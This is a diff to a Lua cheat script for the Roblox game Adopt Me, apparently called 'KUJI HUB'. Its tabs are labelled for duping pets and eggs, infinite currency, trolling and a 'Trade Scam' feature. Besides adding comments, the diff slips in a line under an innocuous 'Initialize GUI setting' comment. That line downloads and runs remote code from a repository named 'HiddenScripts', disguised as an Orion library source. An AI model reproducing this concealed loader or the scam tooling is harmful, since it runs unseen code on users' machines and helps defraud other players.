@@ -1,4 +1,6 @@
+-- Load the Orion library
 local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+-- Create the main window
 local Window = OrionLib:MakeWindow({
     Name = "KUJI HUB | Adopt Me",
     HidePremium = false,
@@ -6,6 +8,11 @@ local Window = OrionLib:MakeWindow({
     ConfigFolder = "OrionTest"
 })
 
+-- Initialize GUI setting
+getgenv().gui = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingHubs/HiddenScripts/main/Orion-librarysource"))()
+
+-- Create "Dupe Eggs" tab
 local Tab = Window:MakeTab({
     Name = "Dupe Eggs",
     Icon = "rbxassetid://4483345998",
@@ -31,7 +38,8 @@ Tab:AddButton({
     end
 })
 
-local Tab = Window:MakeTab({
+-- Create "Trade Scam" tab
+Tab = Window:MakeTab({
     Name = "Trade Scam",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
@@ -59,7 +67,8 @@ Tab:AddTextbox({
     end
 })
 
-local Tab = Window:MakeTab({
+-- Create "AutoFarm" tab
+Tab = Window:MakeTab({
     Name = "AutoFarm 🚜",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
@@ -74,20 +83,8 @@ Tab:AddButton({
     end
 })
 
-local Tab = Window:MakeTab({
-    Name = "AutoFarm",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-
-Tab:AddButton({
-    Name = "Get AutoFarm Source",
-    Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
-    end
-})
-
-local Tab = Window:MakeTab({
+-- Create "Dupe Pets" tab
+Tab = Window:MakeTab({
     Name = "Dupe Pets",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
@@ -112,7 +109,8 @@ Tab:AddButton({
     end
 })
 
-local Tab = Window:MakeTab({
+-- Create "Inf Bucks" tab
+Tab = Window:MakeTab({
     Name = "Inf Bucks [New]✨",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
@@ -125,7 +123,8 @@ Tab:AddButton({
     end
 })
 
-local Tab = Window:MakeTab({
+-- Create "Make All Pets FR" tab
+Tab = Window:MakeTab({
     Name = "Make All Pets FR",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
@@ -146,7 +145,8 @@ Tab:AddButton({
     end
 })
 
-local Tab = Window:MakeTab({
+-- Create "Pet Spawner" tab
+Tab = Window:MakeTab({
     Name = "Pet Spawner",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
@@ -216,7 +216,8 @@ Tab:AddButton({
     end
 })
 
-local Tab = Window:MakeTab({
+-- Create "Troll" tab
+Tab = Window:MakeTab({
     Name = "Troll",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
@@ -238,7 +239,8 @@ Tab:AddButton({
 
 Tab:AddLabel("More Troll Soon!")
 
-local Tab = Window:MakeTab({
+-- Create "Errors/Bugs?" tab
+Tab = Window:MakeTab({
     Name = "Errors/Bugs?❗",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
